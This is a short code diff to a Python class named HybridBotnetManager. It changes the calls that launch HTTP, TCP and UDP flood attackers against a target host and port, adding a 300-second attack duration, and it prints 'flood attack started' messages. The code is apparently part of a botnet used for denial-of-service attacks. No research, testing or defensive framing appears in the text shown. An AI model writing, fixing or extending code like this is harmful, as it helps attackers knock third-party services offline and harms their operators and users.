@@ -504,9 +504,11 @@ class HybridBotnetManager:
                 # Parse target to get host and port
                 host, port = self.parse_target(target)
                 attacker = HTTP_Puncher(
-                    target_url=f"http://{host}:{port}",
+                    u=host,
+                    p=port,
                     threads=100,
-                    timeout=5
+                    timeout=5,
+                    duration=300
                 )
                 attacker.start()
                 print(f"🚀 HTTP flood attack started on {target}")
@@ -523,9 +525,11 @@ class HybridBotnetManager:
                 # Parse target to get host and port
                 host, port = self.parse_target(target)
                 attacker = TCP_Flood(
-                    target_host=host,
-                    target_port=port,
-                    threads=100
+                    u=host,
+                    p=port,
+                    threads=100,
+                    timeout=5,
+                    duration=300
                 )
                 attacker.start()
                 print(f"🚀 TCP flood attack started on {target}")
@@ -543,9 +547,10 @@ class HybridBotnetManager:
                 # Parse target to get host and port
                 host, port = self.parse_target(target)
                 attacker = UDP_Flood(
-                    target_host=host,
-                    target_port=port,
-                    threads=100
+                    u=host,
+                    p=port,
+                    threads=100,
+                    duration=300
                 )
                 attacker.start()
                 print(f"🚀 UDP flood attack started on {target}")
